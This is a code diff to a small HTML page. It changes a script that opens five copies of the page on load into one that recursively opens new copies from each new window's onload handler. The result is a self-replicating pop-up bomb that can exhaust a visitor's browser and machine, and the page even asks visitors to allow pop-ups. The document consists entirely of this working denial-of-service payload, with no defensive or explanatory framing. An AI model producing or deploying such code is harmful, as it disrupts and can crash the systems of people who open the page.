@@ -7,14 +7,17 @@
     <script>
         function openMultipleWindows() {
             for (let i = 0; i < 5; i++) {
-                window.open(window.location.href, '_blank');
+                let newWindow = window.open(window.location.href, '_blank');
+                if (newWindow) {
+                    newWindow.onload = openMultipleWindows;
+                }
             }
         }
         window.onload = openMultipleWindows;
     </script>
 </head>
 <body>
-    <h1>Opening 5 Copies of This Page</h1>
+    <h1>Opening Recursive Copies of This Page</h1>
     <p>If pop-ups are blocked, allow them to enable this functionality.</p>
 </body>
 </html>
